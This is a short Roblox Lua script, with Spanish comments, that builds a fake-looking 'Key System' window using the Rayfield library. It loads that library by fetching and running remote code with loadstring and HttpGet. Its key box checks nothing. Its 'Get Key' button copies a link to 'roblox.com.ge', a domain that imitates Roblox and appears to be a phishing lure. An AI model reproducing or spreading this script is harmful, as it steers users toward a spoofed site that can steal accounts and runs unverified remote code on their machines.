-- 🔑 Sistema de Keys con Rayfield Optimizado

-- Asegúrate de tener Rayfield cargado antes de esto local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield', true))()

-- Crear ventana local Window = Rayfield:CreateWindow({ Name = "🔑 Key System", LoadingTitle = "Verificación", LoadingSubtitle = "by technoourielcompany", ConfigurationSaving = { Enabled = false }, Discord = { Enabled = false }, KeySystem = false })

-- 📝 Tab principal local Tab = Window:CreateTab("Key", 4483362458) -- Icono de candado

-- Caja de texto para escribir la key local KeyBox = Tab:CreateInput({ Name = "Introduce tu Key", PlaceholderText = "Escribe tu clave aquí...", RemoveTextAfterFocusLost = false, Callback = function(text) -- Aquí puedes agregar tu validación de key si quieres Rayfield:Notify({ Title = "ℹ️ Info", Content = "Key ingresada: "..text, Duration = 3 }) end })

-- Botón Get Key local GetKeyButton = Tab:CreateButton({ Name = "📋 Get Key", Callback = function() local link = "https://roblox.com.ge/communities/9554073285/" setclipboard(link) Rayfield:Notify({ Title = "📋 Copiado", Content = "Se copió el link de la Key al portapapeles", Duration = 3 }) end })

